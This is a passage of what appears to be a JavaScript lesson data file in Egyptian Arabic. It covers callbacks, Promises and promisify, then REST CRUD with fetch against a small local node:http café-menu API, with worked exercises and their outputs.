            { lvl: 'سريع', t: R`**اقرا وتوقّع:** [[console.log("A")]] ثم [[setTimeout(() => console.log("B"), 0)]] ثم [[Promise.resolve().then(() => console.log("C"))]] ثم [[fs.readFile(__filename, () => console.log("D"))]] ثم [[console.log("E")]]. اكتب الترتيب قبل ما تشغّل في Node (من قسم ١ في الشرح ودرس «microtasks و macrotasks»).`, done: R`«A E C B D»، وعارف ليه C قبل B (microtask) وليه D آخر واحد.`, sol: R`~~~js order.js
console.log("A");
setTimeout(() => console.log("B"), 0);
Promise.resolve().then(() => console.log("C"));
require("node:fs").readFile(__filename, () => console.log("D"));
console.log("E");
~~~

~~~text الناتج (node order.js، Node 24.22)
A
E
C
B
D
~~~

- **A و E:** كود عادي.
- **C:** الـ [[.then]] microtask، بيتنفّذ أول ما الكود الحالي يخلص وقبل أي timer.
- **B:** callback الـ timer، في أول دورة للـ event loop.
- **D:** قراية الملف بتاخد وقت فعلي (فتح وقراية)، فبتخلص بعد الـ timer. ده «غالبًا» مش «دايمًا»، بس على أي جهاز عادي بيطلع كده.` },
            { lvl: 'تطبيق', t: R`**ابني:** [[toPromise(fn)]] بإيدك: بترجّع function بتاخد نفس الـ arguments وترجّع Promise، وبتحط في الآخر callback [[(err, value)]] بيعمل [[reject]] أو [[resolve]]. جرّبها على [[fs.stat]] لملف موجود وملف مش موجود، وقارنها بـ [[util.promisify]]. وبعدين جرّبها على [[setTimeout]]: إيه اللي حصل وليه [[util.promisify(setTimeout)]] شغالة؟ (من قسمي ٤ و ٥ في الشرح).`, done: R`[[stat]] رجّع الحجم ورفض بـ [[ENOENT]]، والنتيجة زي [[util.promisify]]، و [[toPromise(setTimeout)]] رفضت بـ [[ERR_INVALID_ARG_TYPE]] وعرفت السبب.`, sol: R`~~~js my-promisify.js
// my-promisify.js: promisify بإيدك لأي دالة آخر argument فيها callback (err, value)
const fs = require("node:fs");
const util = require("node:util");

function toPromise(fn) {
  return (...args) =>
    new Promise((resolve, reject) => {
      fn(...args, (err, value) => (err ? reject(err) : resolve(value)));
    });
}

const stat = toPromise(fs.stat);
(async () => {
  const s = await stat("shop.json");
  console.log("حجم:", s.size, "بايت");
  try { await stat("missing.json"); } catch (e) { console.log("خطأ:", e.code); }
  const s2 = await util.promisify(fs.stat)("shop.json");
  console.log("util.promisify:", s2.size === s.size);
  const wait = util.promisify(setTimeout);
  console.log("wait:", await wait(20, "خلصت"));
  const myWait = toPromise(setTimeout);
  await myWait(10).catch(e => console.log("toPromise(setTimeout):", e.code));
  console.log("custom:", typeof setTimeout[util.promisify.custom]);
})();
~~~

~~~text الناتج (node my-promisify.js، Node 24.22)
حجم: 41 بايت
خطأ: ENOENT
util.promisify: true
wait: خلصت
toPromise(setTimeout): ERR_INVALID_ARG_TYPE
custom: function
~~~

- **[[(...args)]]** بيلم كل الـ arguments، و [[fn(...args, callback)]] بيحط الـ callback في الآخر.
- **٤١ بايت** والملف ٣٢ حرف: الحروف العربي بايتين في UTF-8.
- **[[setTimeout(10, callback)]]:** أول argument لازم function، فـ Node رمى [[ERR_INVALID_ARG_TYPE]] جوه الـ executor، والـ Promise اترفضت بيه. [[util.promisify]] بيدوّر الأول على [[fn[util.promisify.custom]]]، و Node حاطط هناك نسخة صح لـ [[setTimeout]].` },
            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** [[readConfig(cb)]] بتقرا [[config.json]] بـ [[fs.readFile]]، وجوه الـ callback: [[if (err) cb(err); cb(null, JSON.parse(text));]]. شغّلها والملف مش موجود. إيه اللي اتطبع والبرنامج عمل إيه؟ صلّحها، وخليها كمان متقعش لو الـ JSON بايظ (من قسم ٣ في الشرح).`, done: R`النسخة البايظة طبعت «مفيش config» ووقعت بـ [[SyntaxError]]، والمصلّحة بتطبع رسالة واحدة في الحالات التلاتة: مش موجود، و JSON بايظ، وسليم.`, sol: R`~~~js bug.js
const fs = require("node:fs");
function readConfig(cb) {
  fs.readFile("config.json", "utf8", (err, text) => {
    if (err) cb(err);
    cb(null, JSON.parse(text));
  });
}
readConfig((err, config) => {
  if (err) return console.log("مفيش config:", err.code);
  console.log("config:", config);
});
~~~

~~~text الناتج (node bug.js، Node 24.22، ومسار الملف في الـ stack اتشال)
مفيش config: ENOENT
<anonymous_script>:1
undefined
^

SyntaxError: "undefined" is not valid JSON
    at JSON.parse (<anonymous>)
    at ReadFileContext.callback (.../bug.js:5:19)
    at FSReqCallback.readFileAfterOpen [as oncomplete] (node:fs:300:13)

Node.js v24.22.1
~~~

~~~js fixed.js
const fs = require("node:fs");
function readConfig(cb) {
  fs.readFile("config.json", "utf8", (err, text) => {
    if (err) return cb(err);
    let config;
    try { config = JSON.parse(text); } catch (e) { return cb(e); }
    cb(null, config);
  });
}
readConfig((err, config) => {
  if (err) return console.log("مفيش config:", err.code || err.message);
  console.log("config:", config);
});
~~~

~~~text الناتج: من غير ملف، ثم {"port": 3000,}، ثم {"port": 3000}
مفيش config: ENOENT
مفيش config: Expected double-quoted property name in JSON at position 14 (line 1 column 15)
config: { port: 3000 }
~~~

- **من غير [[return]]** الكود كمّل لـ [[JSON.parse(undefined)]]، فالـ callback اتنده مرة بالخطأ وبعدين البرنامج وقع. الـ [[return]] قبل أي callback للخطأ عادة لازم تبقى أوتوماتيك.
- **[[try]] حوالين [[JSON.parse]] بس** مش حوالين [[cb(null, config)]]: لو حطيت الـ [[cb]] جوه الـ try وكود اليوزر رمى خطأ، هتنادي [[cb]] تاني بالخطأ ده (callback مرتين).
- **الفاصلة الزيادة** بعد [[3000]] مش مسموحة في JSON.` },
            { lvl: 'تطبيق', t: R`**ابني في المتصفح:** [[loadImage(src)]] بترجّع Promise من [[onload]] و [[onerror]]. حمّل صورتين بـ [[Promise.all]] واطبع مقاساتهم، وبعدين صورة موجودة وواحدة لأ بـ [[Promise.allSettled]]. وقارن بـ [[img.decode()]] (من قسم ٤ في الشرح ودرس «Promise.all و allSettled»).`, done: R`[[all]] رجّعت المقاسين، و [[allSettled]] رجّعت واحدة [[fulfilled]] وواحدة برسالتك، و [[decode()]] رجّعت نفس المقاس.`, sol: R`~~~js images.js (في صفحة فيها dot.svg مقاسه 40×40)
function loadImage(src) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    img.onload = () => resolve(img);
    img.onerror = () => reject(new Error("الصورة مش موجودة: " + src));
    img.src = src;
  });
}
const imgs = await Promise.all(["dot.svg", "dot.svg?v=2"].map(loadImage));
console.log("all:", imgs.map(i => i.naturalWidth + "x" + i.naturalHeight).join(", "));
const results = await Promise.allSettled(["dot.svg", "nope.png"].map(loadImage));
console.log("allSettled:", results.map(r => (r.status === "fulfilled" ? "ok " + r.value.naturalWidth : r.reason.message)).join(" | "));
const img = new Image();
img.src = "dot.svg";
await img.decode();
console.log("decode():", img.naturalWidth);
~~~

~~~text الناتج (Chrome 157، [[<script type="module">]] عشان الـ await برّه function)
all: 40x40, 40x40
allSettled: ok 40 | الصورة مش موجودة: nope.png
decode(): 40
~~~

- **[[Promise.all]]** بتفشل كلها لو صورة واحدة فشلت، فلمعرض صور استخدم [[allSettled]] واعرض اللي نجح.
- **[[img.decode()]]** هي نسخة الـ Promise الجاهزة في المتصفحات الجديدة، وكمان بتستنى فك الصورة نفسه، فمبيحصلش «وميض» لما تحطها في الصفحة.
- **الـ 404** بيطلع في الـ Console كمان كـ «Failed to load resource»، وده من المتصفح مش من كودك.` },
            { lvl: 'سريع', t: R`**اشرحها:** في ٣ سطور لزميل: ليه Promise أحسن من callback، من غير ما تقول «أنضف»؟ استخدم اللي اتقاس في الدرس (من قسم ٣ في الشرح).`, done: R`٣ نقط بأمثلة حقيقية من الدرس، مش كلام عام.`, sol: R`**إجابة نموذجية:**

1. **الضمانات:** الـ Promise بتتحل مرة واحدة ([[badRead]] نده الـ callback مرتين، والـ Promise أخدت أول قيمة بس)، و [[.then]] دايمًا async، فمفيش كود بيشتغل مرة قبل ومرة بعد.
2. **الأخطاء في مكان واحد:** في [[hell.js]] كل مستوى محتاج [[if (err)]]، و [[JSON.parse]] لو رمت محدش بيمسكها. في [[flat.js]] [[catch]] واحد بيمسك أي خطأ في أي خطوة.
3. **التركيب:** Promise قيمة تقدر ترجّعها وتخزّنها وتديها لـ [[Promise.all]] و [[AbortSignal.timeout]] و [[await]]. الـ callback مبيترجّعش، فـ «استنى ٣ حاجات مع بعض» أو «اقطع بعد ٥ ثواني» بتتكتب بإيدك كل مرة.

والـ callbacks لسه صح في حاجة واحدة: الأحداث اللي بتتكرر ([[progress]] و [[message]] و [[click]])، لأن Promise بتتحل مرة واحدة.` },
          ],
          ref: [
            { t: "MDN Learn: Introducing asynchronous JavaScript", url: "https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Async_JS/Introducing" },
            { t: "MDN: Callback function", url: "https://developer.mozilla.org/en-US/docs/Glossary/Callback_function" },
            { t: "MDN: XMLHttpRequest", url: "https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" },
            { t: "Node.js: util.promisify", url: "https://nodejs.org/api/util.html" },
          ],
          pre: ["js/Promise", "js/async و await", { to: "js/EventEmitter", why: R`الأحداث في Node نفس فكرة [[xhr.addEventListener]]` }, { to: "js/microtasks و macrotasks", why: R`ليه [[.then]] قبل [[setTimeout]] حتى بـ ٠` }],
          deep: {
            why: R`هتقابل callbacks في كل حتة: مكتبات Node قديمة، و [[setTimeout]]، و [[FileReader]]، و [[img.onload]]، و SDKs لخدمات دفع وخرائط. لازم تعرف تقراها، وتعرف تلفّها في Promise عشان باقي كودك يفضل [[await]].`,
            how: R`الـ API بيبدأ الشغل في الخلفية (thread تاني في libuv أو في المتصفح) ويرجع على طول. لما يخلص بيحط الـ callback في طابور الـ event loop. [[new Promise]] بيديك [[resolve]] و [[reject]]، وانت بتناديهم من جوه الـ callback، والـ Promise بتتجاهل أي نداء بعد الأول.`,
            when: R`Promise و [[await]] لأي عملية بتحصل مرة. listener أو callback للحاجات اللي بتتكرر. [[util.promisify]] أو [[new Promise]] لما المكتبة مفيهاش نسخة Promise. [[util.callbackify]] بس لو مكتبة قديمة طالبة callback منك.`,
            mistakes: R`نسيان [[return]] بعد [[cb(err)]]. [[try]] حوالين [[cb(...)]] نفسه. الاعتماد على ترتيب عمليتين async. تعيين [[img.src]] قبل [[onload]]. Promise لحدث بيتكرر. [[promisify]] على دالة الـ callback بتاعتها مش في الآخر. خلط الأسلوبين في نفس الدالة (callback وكمان بترجّع Promise).`,
          },
        },
        {
          cmd: "REST و CRUD بـ fetch",
          title: "GET و POST و PUT و PATCH و DELETE: تكلّم API حقيقي، وتجيب نص وصور مش JSON بس",
          desc: R`REST طريقة لتصميم الـ API: البيانات «resources» ليها عناوين ([[/api/items]] للستة، و [[/api/items/3]] لعنصر)، والـ HTTP method بيقول هتعمل إيه فيها. العمليات الأربعة على أي بيانات اسمها CRUD (Create و Read و Update و Delete)، وكل واحدة ليها method و status code:
• Create: [[POST /api/items]] ← [[201 Created]] و header [[Location]].
• Read: [[GET /api/items]] و [[GET /api/items/3]] ← [[200]]، أو [[404]].
• Update: [[PUT]] (بدّل العنصر كله) أو [[PATCH]] (غيّر حقول بس) ← [[200]].
• Delete: [[DELETE /api/items/3]] ← [[204 No Content]].
• الغلط: [[400]] بيانات بايظة، و [[404]] مش موجود، و [[409]] تعارض، و [[405]] method مش مسموح.
وبـ [[fetch]] نفسه بتجيب نص ([[res.text()]]) و JSON ([[res.json()]]) وصور وملفات ([[res.blob()]] و [[URL.createObjectURL]]).`,
          example: R`const API = "http://localhost:3000/api/items";
const json = { "Content-Type": "application/json" };
const created = await (await fetch(API, { method: "POST", headers: json, body: JSON.stringify({ name: "لاتيه", price: 60 }) })).json();
const list = await (await fetch(API)).json();
await fetch(API + "/" + created.id, { method: "PUT", headers: json, body: JSON.stringify({ name: "لاتيه كبير", price: 70 }) });
await fetch(API + "/" + created.id, { method: "PATCH", headers: json, body: JSON.stringify({ price: 65 }) });
const del = await fetch(API + "/" + created.id, { method: "DELETE" });
const gone = await fetch(API + "/" + created.id);
console.log(created, list.length, del.status, gone.status, gone.ok);`,
          try: R`شغّل [[server.js]] اللي في الشرح بـ [[node server.js]]، وفي ترمنال تاني [[node crud.js]]. وبعدين بـ [[curl -i]]: اعمل [[POST]] بـ JSON بايظ ([[-d '{bad']])، و [[DELETE]] على [[/api/items]] (من غير id)، و [[DELETE]] على نفس العنصر مرتين. إيه الـ status والـ headers في كل واحدة؟`,
          sol: R`~~~bash
curl -s -i -X POST localhost:3000/api/items -d '{bad'
curl -s -i -X DELETE localhost:3000/api/items
curl -s -i -X DELETE localhost:3000/api/items/4
curl -s -i -X DELETE localhost:3000/api/items/4
~~~

~~~text الناتج (Git Bash على ويندوز، Node 24.22، أهم السطور)
HTTP/1.1 400 Bad Request
{"error":"الـ body لازم JSON object"}

HTTP/1.1 405 Method Not Allowed
Allow: GET, POST
{"error":"method مش مسموح"}

HTTP/1.1 204 No Content

HTTP/1.1 404 Not Found
{"error":"الصنف 4 مش موجود"}
~~~

- **405 معاه [[Allow]]:** السيرفر بيقولك الـ methods اللي ينفعوا على العنوان ده.
- **[[DELETE]] مرتين:** الأولى 204 والتانية 404، بس **حالة السيرفر واحدة** بعد الاتنين (العنصر مش موجود). ده معنى إن [[DELETE]] idempotent (قسم ٤).
- **204 مفيهوش body خالص**، فمتعملش [[res.json()]] عليه.`,
          teach: R`## الفكرة

API الـ REST بيعامل البيانات كأشياء ليها عناوين، والـ method هو الفعل:

| CRUD | الـ method والعنوان | الـ body | الرد الصح |
|---|---|---|---|
| Create | [[POST /api/items]] | العنصر الجديد من غير id | [[201]] والعنصر بالـ id، و [[Location: /api/items/3]] |
| Read (لستة) | [[GET /api/items]] | مفيش | [[200]] و array |
| Read (واحد) | [[GET /api/items/3]] | مفيش | [[200]] أو [[404]] |
| Update كامل | [[PUT /api/items/3]] | العنصر كله | [[200]] (أو [[204]]) |
| Update جزئي | [[PATCH /api/items/3]] | الحقول اللي اتغيّرت بس | [[200]] |
| Delete | [[DELETE /api/items/3]] | مفيش | [[204]] من غير body |

القواعد: العنوان اسم (resource) مش فعل: [[/api/items/3]] مش [[/api/deleteItem?id=3]]. والجمع للستة ([[items]]). والـ status code بيقول اللي حصل، والـ body فيه التفاصيل. (أساس HTTP نفسه في درس «HTTP: الطلب والرد»، والـ status codes بالتفصيل في درس «Status codes».)

---

## ١. السيرفر اللي هنكلّمه

API صغير بـ [[node:http]] من غير أي مكتبة، والبيانات في [[Map]] في الذاكرة (بتروح مع الـ restart). منيو كافيه فيه صنفين:

~~~js server.js
// server.js: REST API صغير لمنيو كافيه، والبيانات في الذاكرة
const http = require("node:http");

const items = new Map([
  [1, { id: 1, name: "قهوة", price: 45 }],
  [2, { id: 2, name: "شاي", price: 20 }],
]);
let nextId = 3;

function send(res, status, body) {
  res.writeHead(status, body === undefined ? {} : { "Content-Type": "application/json; charset=utf-8" });
  res.end(body === undefined ? undefined : JSON.stringify(body));
}

async function readJson(req) {
  let text = "";
  for await (const chunk of req) text += chunk;
  try { return JSON.parse(text); } catch { return undefined; }
}

function check(body, partial) {
  if (!body || typeof body !== "object") return "الـ body لازم JSON object";
  if (!partial || "name" in body) if (typeof body.name !== "string" || !body.name.trim()) return "name لازم نص مش فاضي";
  if (!partial || "price" in body) if (!Number.isFinite(body.price) || body.price < 0) return "price لازم رقم موجب";
  return null;
}

const nameTaken = (name, exceptId) => [...items.values()].some(i => i.name === name && i.id !== exceptId);

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, "http://localhost");
  const m = url.pathname.match(/^\/api\/items(?:\/(\d+))?$/);
  if (!m) return send(res, 404, { error: "مفيش resource بالاسم ده" });
  const id = m[1] && Number(m[1]);

  if (!id) {
    if (req.method === "GET") return send(res, 200, [...items.values()]);
    if (req.method === "POST") {
      const body = await readJson(req);
      const problem = check(body, false);
      if (problem) return send(res, 400, { error: problem });
      if (nameTaken(body.name)) return send(res, 409, { error: "الصنف ده موجود" });
      const item = { id: nextId++, name: body.name.trim(), price: body.price };
      items.set(item.id, item);
      res.setHeader("Location", "/api/items/" + item.id);
      return send(res, 201, item);
    }
    res.setHeader("Allow", "GET, POST");
    return send(res, 405, { error: "method مش مسموح" });
  }

  const item = items.get(id);
  if (!item) return send(res, 404, { error: "الصنف " + id + " مش موجود" });
  if (req.method === "GET") return send(res, 200, item);
  if (req.method === "DELETE") { items.delete(id); return send(res, 204); }
  if (req.method === "PUT" || req.method === "PATCH") {
    const body = await readJson(req);
    const problem = check(body, req.method === "PATCH");
    if (problem) return send(res, 400, { error: problem });
    if (body.name && nameTaken(body.name, id)) return send(res, 409, { error: "الصنف ده موجود" });
    const next = req.method === "PUT" ? { id, name: body.name.trim(), price: body.price } : { ...item, ...body, id };
    items.set(id, next);
    return send(res, 200, next);
  }
  res.setHeader("Allow", "GET, PUT, PATCH, DELETE");
  return send(res, 405, { error: "method مش مسموح" });
});

server.listen(process.env.PORT || 3000, () => console.log("API على http://localhost:" + server.address().port + "/api/items"));
module.exports = server;
~~~

أهم الحتت:

- **[[url.pathname.match(/^\/api\/items(?:\/(\d+))?$/)]]:** عنوان واحد للستة وعنوان للعنصر. [[(\d+)]] بيمسك الـ id، و [[(?:...)?]] بتخلي الجزء ده اختياري.
- **[[for await (const chunk of req)]]:** الـ body بيوصل حتت (stream)، فبنجمّعه وبعدين [[JSON.parse]]. لو بايظ بنرجّع [[undefined]] و [[check]] بيحوّلها لـ 400.
- **[[check(body, partial)]]:** [[POST]] و [[PUT]] لازم كل الحقول، و [[PATCH]] (partial) يفحص اللي اتبعت بس.
- **[[{ ...item, ...body, id }]]:** الـ PATCH بيدمج، والـ [[id]] في الآخر عشان محدش يغيّره من الـ body.
- **[[send(res, 204)]]** من غير body ومن غير [[Content-Type]].

تفاصيل [[node:http]] نفسه في درس «node:http سيرفر من غير مكتبة».

---

## ٢. الـ ٥ عمليات بـ [[fetch]]

~~~js crud.js
// crud.js: الـ ٥ عمليات على الـ API بـ fetch (Node 24)
const API = "http://localhost:3000/api/items";
const json = { "Content-Type": "application/json" };

async function call(method, url, body) {
  const res = await fetch(url, { method, headers: body ? json : {}, body: body && JSON.stringify(body) });
  const data = res.status === 204 ? null : await res.json();
  console.log(method.padEnd(6), res.status, res.ok, JSON.stringify(data));
  return data;
}

const created = await call("POST", API, { name: "لاتيه", price: 60 });
await call("GET", API);
await call("PUT", API + "/" + created.id, { name: "لاتيه كبير", price: 70 });
await call("PATCH", API + "/" + created.id, { price: 65 });
await call("DELETE", API + "/" + created.id);
await call("GET", API + "/" + created.id);
await call("POST", API, { name: "قهوة", price: 45 });
await call("POST", API, { name: "" });
~~~

~~~text الناتج (node server.js في ترمنال، و node crud.js في التاني، Node 24.22)
POST   201 true {"id":3,"name":"لاتيه","price":60}
GET    200 true [{"id":1,"name":"قهوة","price":45},{"id":2,"name":"شاي","price":20},{"id":3,"name":"لاتيه","price":60}]
PUT    200 true {"id":3,"name":"لاتيه كبير","price":70}
PATCH  200 true {"id":3,"name":"لاتيه كبير","price":65}
DELETE 204 true null
GET    404 false {"error":"الصنف 3 مش موجود"}
POST   409 false {"error":"الصنف ده موجود"}
POST   400 false {"error":"name لازم نص مش فاضي"}
~~~

**كل حتة في الطلب:**

- **[[method]]:** من غير ما تكتبه [[GET]]. بيتكتب بأي case بس الصح كابيتال.
- **[[headers: { "Content-Type": "application/json" }]]:** بتقول للسيرفر الـ body نوعه إيه. من غيرها [[fetch]] بيبعت النص بـ [[text/plain;charset=UTF-8]] (تمرين ٤)، وسيرفرات كتير (Express بـ [[express.json()]] مثلًا) هتتجاهل الـ body.
- **[[body: JSON.stringify(...)]]:** الـ body لازم نص أو [[FormData]] أو [[Blob]] أو [[URLSearchParams]]. لو بعت object على طول بيتحوّل لـ [["[object Object]"]].
- **[[GET]] و [[DELETE]] من غير body.** و [[fetch]] بيرفض body مع [[GET]]: [[TypeError: Request with GET/HEAD method cannot have body.]] (Node 24).

**كل حتة في الرد:**

- **[[res.status]] و [[res.ok]]:** [[ok]] = [[true]] لو الـ status من 200 لـ 299. **[[fetch]] مبيرميش على 404 ولا 500**، بيرمي على الشبكة بس. فبعد كل طلب: [[if (!res.ok) throw ...]] (مشروع «fetch محترم» مبني على النقطة دي).
- **[[res.status === 204 ? null : await res.json()]]:** الـ 204 مفيهوش body، و [[json()]] عليه بترمي.
- **[[res.headers.get("Location")]]:** بعد 201 فيه عنوان العنصر الجديد ([[/api/items/3]]).

---

## ٣. الـ status codes اللي الـ API ده بيرجّعها

| الكود | امتى عندنا | الـ client يعمل إيه |
|---|---|---|
| [[200 OK]] | [[GET]] و [[PUT]] و [[PATCH]] نجحوا | يستخدم الـ body |
| [[201 Created]] | [[POST]] نجح | ياخد الـ id، أو يروح لـ [[Location]] |
| [[204 No Content]] | [[DELETE]] نجح | ميقراش body |
| [[400 Bad Request]] | JSON بايظ أو حقل ناقص | يعرض [[error]] جنب الفورم |
| [[404 Not Found]] | id مش موجود أو عنوان غلط | «اتمسح أو مش موجود»، ويحدّث اللستة |
| [[405 Method Not Allowed]] | [[DELETE /api/items]] | باج في الـ client، شوف [[Allow]] |
| [[409 Conflict]] | الاسم موجود | رسالة لليوزر يغيّر الاسم |

---

## ٤. Idempotent: نفس الطلب مرتين

طلب **idempotent** لو تكراره بيسيب السيرفر في نفس الحالة اللي سابها فيها أول مرة. ده مهم لأن الشبكة بتقطع، والـ client ممكن يعيد الطلب مش عارف إذا كان وصل:

~~~text الناتج: idempotent.js (تمرين ٣)
البداية: 2 أصناف
POST مرتين: 201 409 → 3
PUT مرتين: 200 200 → 3
DELETE مرتين: 204 404 → 2
~~~

| الـ method | idempotent؟ | safe (مبيغيّرش حاجة)؟ |
|---|---|---|
| [[GET]] | آه | آه |
| [[PUT]] | آه: «خليه كده» مرتين = نفس النتيجة | لأ |
| [[DELETE]] | آه: الحالة واحدة، حتى لو الرد اتغيّر 204 ثم 404 | لأ |
| [[PATCH]] | مش مضمون ([[{ "stock": "+1" }]] مثلًا) | لأ |
| [[POST]] | لأ: مرتين = عنصرين | لأ |

[[POST]] التاني رجّع 409 **بس عشان سيرفرنا** بيمنع الاسم المكرر. من غير القاعدة دي كان هيبقى فيه صنفين «كابتشينو». عشان كده الـ client ميعيدش [[POST]] لوحده بعد timeout، ويعيد [[GET]] و [[PUT]] و [[DELETE]] عادي (مشروع «إعادة المحاولة الذكية»). والحل الاحترافي لـ [[POST]]: header [[Idempotency-Key]] بـ id عشوائي، والسيرفر يرفض نفس المفتاح مرتين.

---

## ٥. مش JSON بس: نص وصور وملفات

الـ [[Response]] فيه أكتر من طريقة تقرا الـ body، وكل واحدة بترجّع Promise:

| الطريقة | بترجّع | لـ |
|---|---|---|
| [[res.json()]] | object | APIs |
| [[res.text()]] | نص | [[.txt]] و [[.csv]] و [[.md]] و HTML |
| [[res.blob()]] | [[Blob]] (بايتس ونوعها) | صور، PDF، أي ملف تعرضه أو تنزّله |
| [[res.arrayBuffer()]] | بايتس خام | تحليل ملف بإيدك، WebAssembly |
| [[res.formData()]] | [[FormData]] | نادر |

~~~js media.js (صفحة من سيرفر محلي، [[<script type="module">]])
const text = await (await fetch("hello.txt")).text();
console.log("text:", JSON.stringify(text));
const res = await fetch("dot.svg");
console.log("type:", res.headers.get("Content-Type"), res.headers.get("Content-Length"));
const blob = await res.blob();
console.log("blob:", blob.type, blob.size);
const url = URL.createObjectURL(blob);
console.log("url:", url.slice(0, 27) + "...");
const img = document.createElement("img");
img.src = url;
img.alt = "نقطة خضرا";
await img.decode();
document.body.append(img);
console.log("img:", img.naturalWidth, img.complete);
URL.revokeObjectURL(url);
~~~

~~~text الناتج (Chrome 157)
text: "أهلًا من ملف نص\nسطر تاني\n"
type: image/svg+xml 114
blob: image/svg+xml 114
url: blob:http://localhost:8765/...
img: 40 true
~~~

- **[[URL.createObjectURL(blob)]]** بيعمل عنوان مؤقت [[blob:http://localhost:8765/...]] يشاور على البايتس اللي في الذاكرة، فتقدر تحطه في [[img.src]] أو [[a.href]] (مع [[download]] للتنزيل).
- **[[URL.revokeObjectURL(url)]]** بعد ما الصورة اتحمّلت ([[decode()]]) عشان الذاكرة تتحرر. لو نسيتها في لستة صور بتتغيّر، الذاكرة بتزيد (درس «memory leaks»).
- **ليه blob مش [[img.src = "dot.svg"]] على طول؟** لما الصورة محتاجة header (توكن)، أو عايز تعرف حجمها ونوعها قبل ما تعرضها، أو تعمل preview لملف قبل ما يترفع.

**الـ body بيتقرا مرة واحدة، والـ 404 ممكن يبقى HTML أو نص:**

~~~text الناتج (Chrome 157)
TypeError: Failed to execute 'text' on 'Response': body stream already read
404: 404 false Not Found
SyntaxError: Unexpected token 'o', "not found" is not valid JSON
~~~

السطر الأول: [[json()]] وبعدين [[text()]] على نفس الرد. لو محتاج الاتنين: [[res.clone()]] قبل القراية. والتالت: السيرفر رجّع [[not found]] نص، و [[json()]] حاولت تفكّه. افحص [[res.ok]] (وممكن [[Content-Type]]) **قبل** [[json()]]. (نفس الخطأ مع صفحة HTML: درس «Unexpected token '<'».)

---

## الخلاصة

| عايز | اكتب |
|---|---|
| لستة | [[await (await fetch(API)).json()]] |
| تضيف | [[fetch(API, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(x) })]] ← 201 |
| تبدّل كله / حقول | [[PUT]] / [[PATCH]] على [[API + "/" + id]] ← 200 |
| تمسح | [[fetch(API + "/" + id, { method: "DELETE" })]] ← 204 |
| تعرف نجح | [[res.ok]] (fetch مبيرميش على 404) |
| نص / صورة | [[res.text()]] / [[res.blob()]] و [[URL.createObjectURL]] |

اللي ميتلخبطش: [[JSON.stringify]] و [[Content-Type]] مع أي body، و [[res.ok]] قبل [[json()]]، والـ 204 مفيهوش body، و [[POST]] متتعادش لوحدها.`,
          lines: [
            R`عنوان الـ resource: اللستة كلها`,
            R`الـ header اللي بيقول إن الـ body JSON، هنستخدمه في كل طلب فيه body`,
            R`Create: [[POST]] للستة بـ JSON، والرد 201 فيه العنصر بالـ id الجديد (٣)`,
            R`Read: [[GET]] (الافتراضي) للستة كلها، و [[json()]] بيفك الـ array`,
            R`Update كامل: [[PUT]] على عنوان العنصر بكل حقوله`,
            R`Update جزئي: [[PATCH]] بالسعر بس، والاسم بيفضل زي ما هو`,
            R`Delete: من غير body، والرد 204 من غير body`,
            R`[[GET]] على عنصر اتمسح: الرد 404 و [[fetch]] مرماش`,
            R`بيطبع العنصر اللي اتعمل، وعدد اللستة (٣)، و [[204]]، و [[404]]، و [[false]]`,
          ],
          practice: [
            { lvl: 'سريع', t: R`**مراجعة:** من غير ما تبص فوق، املا الجدول لـ API تعليقات على بوست: «هات تعليقات البوست ٧»، «ضيف تعليق»، «عدّل نص تعليق ٤٢ بس»، «امسح تعليق ٤٢»، «امسح تعليق ٤٢ تاني مرة». لكل واحدة: الـ method، والعنوان، والـ body، والـ status اللي المفروض يرجع (من قسمي ١ و ٣ في الشرح).`, done: R`٥ صفوف، وعناوين أسماء مش أفعال، والمسح التاني 404.`, sol: R`**إجابة نموذجية:**

| العملية | الـ method والعنوان | الـ body | الرد |
|---|---|---|---|
| تعليقات البوست ٧ | [[GET /api/posts/7/comments]] | مفيش | [[200]] و array (فاضي [[[]]] لو مفيش، مش 404) |
| ضيف تعليق | [[POST /api/posts/7/comments]] | [[{ "text": "..." }]] | [[201]] و [[Location: /api/comments/42]] |
| عدّل النص بس | [[PATCH /api/comments/42]] | [[{ "text": "..." }]] | [[200]] |
| امسح | [[DELETE /api/comments/42]] | مفيش | [[204]] |
| امسح تاني | [[DELETE /api/comments/42]] | مفيش | [[404]] (والحالة نفسها: idempotent) |

- **الـ resources المتداخلة** ([[/posts/7/comments]]) للستة اللي تبع حاجة. والتعليق نفسه ليه عنوان لوحده لأن الـ id بتاعه فريد.
- **لستة فاضية = 200 و [[[]]]**: البوست موجود ومالوش تعليقات. الـ 404 لو البوست نفسه مش موجود.
- جرّبنا نفس الحالات على [[server.js]] في الشرح (منيو مش تعليقات): الـ 201 و 204 و 404 بالظبط زي الجدول.` },
            { lvl: 'تطبيق', t: R`**قيس بنفسك:** [[idempotent.js]] بيبعت كل طلب من دول مرتين ويطبع الـ status وعدد الأصناف بعدها: [[POST]] بنفس الصنف، و [[PUT /api/items/2]] بنفس البيانات، و [[DELETE /api/items/3]]. مين غيّر الحالة في المرة التانية؟ (من قسم ٤ في الشرح).`, done: R`[[POST]] التاني رجع 409 (بسبب قاعدة الاسم)، و [[PUT]] 200 مرتين والعدد ثابت، و [[DELETE]] 204 ثم 404 والعدد ثابت بعد الأولى.`, sol: R`~~~js idempotent.js
// idempotent.js: نفس الطلب مرتين، والسيرفر بقى فيه إيه؟
const API = "http://localhost:3000/api/items";
const send = async (method, url, body) => {
  const res = await fetch(url, { method, headers: { "Content-Type": "application/json" }, body: body && JSON.stringify(body) });
  return res.status;
};
const count = async () => (await (await fetch(API)).json()).length;

console.log("البداية:", await count(), "أصناف");
console.log("POST مرتين:", await send("POST", API, { name: "كابتشينو", price: 55 }), await send("POST", API, { name: "كابتشينو", price: 55 }), "→", await count());
console.log("PUT مرتين:", await send("PUT", API + "/2", { name: "شاي", price: 25 }), await send("PUT", API + "/2", { name: "شاي", price: 25 }), "→", await count());
console.log("DELETE مرتين:", await send("DELETE", API + "/3"), await send("DELETE", API + "/3"), "→", await count());
~~~

~~~text الناتج (سيرفر جديد، node idempotent.js، Node 24.22)
البداية: 2 أصناف
POST مرتين: 201 409 → 3
PUT مرتين: 200 200 → 3
DELETE مرتين: 204 404 → 2
~~~

- **الملف [[.js]] وفيه [[await]] برّه function:** Node 24 بيكتشف إنه ESM لوحده (module syntax detection) لما مفيش [[package.json]] بيقول غير كده.
